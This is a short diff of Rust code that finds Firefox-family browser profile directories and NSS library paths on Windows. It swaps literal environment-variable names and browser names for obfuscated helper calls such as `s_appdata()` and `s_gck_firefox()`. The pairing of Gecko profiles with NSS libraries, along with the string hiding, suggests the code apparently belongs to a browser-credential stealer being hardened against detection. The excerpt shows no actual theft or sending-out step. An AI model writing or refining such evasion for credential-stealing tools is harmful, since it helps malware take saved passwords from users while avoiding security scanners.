@@ -10,8 +10,8 @@ pub struct GeckoBrowserInfo {
 }
 
 pub fn get_browsers() -> Vec<GeckoBrowserInfo> {
-    let roaming = env::var("APPDATA").unwrap_or_default();
-    let local = env::var("LOCALAPPDATA").unwrap_or_default();
+    let roaming = env::var(s_appdata()).unwrap_or_default();
+    let local = env::var(s_localappdata()).unwrap_or_default();
 
     vec![
         GeckoBrowserInfo {
@@ -83,9 +83,9 @@ pub fn get_browsers() -> Vec<GeckoBrowserInfo> {
 }
 
 fn nss_candidates(browser_name: &str) -> Vec<PathBuf> {
-    let pf = env::var("ProgramFiles").unwrap_or_default();
-    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
-    let local = env::var("LOCALAPPDATA").unwrap_or_default();
+    let pf = env::var(s_env_programfiles()).unwrap_or_default();
+    let pf86 = env::var(s_env_programfiles86()).unwrap_or_default();
+    let local = env::var(s_localappdata()).unwrap_or_default();
 
     match browser_name {
         n if n == s_gck_firefox() => vec![
